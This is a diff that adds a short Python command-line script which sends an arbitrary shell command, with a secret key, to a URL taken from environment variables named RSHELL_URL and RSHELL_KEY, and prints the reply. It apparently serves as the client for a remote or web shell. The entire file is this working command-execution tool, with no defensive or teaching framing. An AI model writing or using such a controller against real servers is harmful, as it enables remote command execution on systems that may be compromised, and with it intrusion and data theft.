@@ -1,0 +1,15 @@
+#!/usr/bin/env python3
+import click
+import requests 
+
+@click.command()
+@click.argument("cmd")
+@click.argument("url", envvar="RSHELL_URL")
+@click.argument("key", envvar="RSHELL_KEY")
+
+def send_payload(url, cmd, key):
+  res = requests.post(url, data={"key": key, "shell": cmd})
+  print(res.text)
+
+if __name__ == "__main__":
+  send_payload()
